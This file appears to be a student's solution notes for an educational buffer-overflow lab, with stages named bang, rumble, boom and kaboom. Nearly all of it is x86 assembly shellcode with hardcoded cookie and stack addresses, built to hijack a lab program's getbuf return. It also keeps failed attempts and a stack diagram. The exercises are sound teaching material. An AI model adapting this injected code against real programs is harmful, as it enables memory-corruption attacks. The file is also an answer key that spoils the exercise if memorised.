## bang
push %ebp
mov %esp,%ebp
mov 0x804d1a0,%eax
mov %eax,0x804d1a8   # global_value = cookie
leave
ret


##rumble  SEGSEGV,segmentation fault

#push %ebp
#mov  %esp,%ebp
#mov  $0x61f14dbf,%eax #string(cookie)'s address to eax
#mov  0xc(%ebp),%ebx   #string(str)'s address to ebx
#mov  (%eax),%ecx      #4 bytes to ecx,Segmetation fault
#mov  $0x31463136,%ecx
#mov  %ecx,(%ebx)      #
#mov  0x4(%eax),%ecx   
#mov  $0x46424434,%ecx
#mov  %ecx,0x4(%ebx)   #next 4 bytes
##movb $0x0,0x8(%ebx)
#leave
#ret 

#push %ebp
#mov  %esp,%ebp
#mov  $0x61f14dbf,%eax
#mov  %eax,0xc(%ebp)     #cookie and str are the same pointer
#leave           cookie = str ,Segementation fault
#ret 


push %ebp
mov  %esp,%ebp
#mov  $0x61f14dbf,%eax #string(cookie)'s address to eax
mov  $0x556836fe,%ebx   #string(str)'s address to ebx //
mov  %ebx,0xc(%ebp)    #str=ebp->  string
mov  $0x31463136,%ecx
mov  %ecx,(%ebx )
mov  $0x46424434,%ecx
mov  %ecx,0x4(%ebx)
movb $0x0,0x8(%ebx)
leave 
ret 



## boom

#0x804d1a0 <cookie>:     0x61f14dbf
#0x55683740 <getbuf's ebp>: 0x55683760      0x08049584

mov  $0x08049584,%eax
push %eax   # saved eip
push %ebp   # saved esp
mov  %esp,%ebp
mov  $0x61f14dbf,%eax
leave 
ret 

## kaboom
#/*  
#
#           +------+
#           |      |
#           |      |
#testn: ebp |      |      sub $0x28,%esp
#        .  |      |
#        .  |      |
#        .  |      |
#       0x28|      |
#       esp |      |
#getbufn:   | eip  |
#           | ebp  |
#       ebp |      |
#        .  |      |
#        .  |      |
#        .  |      |
#      0x2df|      |      lea -0x2df(%ebp),%eax
#   string->|      |
#           |      |
#           |      |
#           |      |
#           +------+
#0x804d1a0 <cookie>:     0x61f14dbf
#*/

lea   0x28(%esp),%ebp     #  add $0x28,%esp
pushl $0x80495fe          #  saved eip
pushl %ebp
mov   %esp,%ebp
movl  $0x61f14dbf,%eax
leave
ret

























